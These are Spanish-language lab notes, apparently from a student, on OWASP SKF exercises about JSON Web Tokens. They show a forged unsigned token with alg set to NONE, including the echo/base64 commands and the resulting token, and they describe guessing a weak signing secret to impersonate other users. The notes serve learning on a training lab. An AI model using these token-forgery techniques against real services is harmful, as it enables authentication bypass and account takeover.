Json web token null cypher
Con skf labs entramos a /json/jwt-null

Nos vamos al inspwctor en storage y  localstorage podemos ver el token
lo copiamos y pegamos en jwt.io
![[Pasted image 20250418105126.png]]
Lo que vamos a hacer es modificar el payload tal que vamos a buscar una vulnerabilidad potencial
Es decir:
Abrimos consola
Esta seria la primera parte correspondiente a la cabecera o header
echo -n '{"alg":"NONE","typ":"JWT"}' | base64

		Salida Consola: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0
Ahora modificaremos la parte de payload
echo -n '{"id":2,"iat":1744994452,"exp":1744998052}' | base64

		Salida Consola: eyJpZCI6MiwiaWF0IjoxNzQ0OTk0NDUyLCJleHAiOjE3NDQ5OTgwNTJ9

Ahora los uniremos y probaremos la vulnerabilidad
	
		eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNzQ0OTk0NDUyLCJleHAiOjE3NDQ5OTgwNTJ9.

Y hemos logrado acceder como user 2


Escenario 2
Abrimos JWT-Secret 

En el caso de que si nos valide el campo(desconocemos el secreto para crear el json web token)

Muchas veces emplean en el secret contraseñas debiles entonces,  la palabra secret
y PWNED
Hemos accedido al otro usuario

Al tener el secret podemos acceder a cualquier user

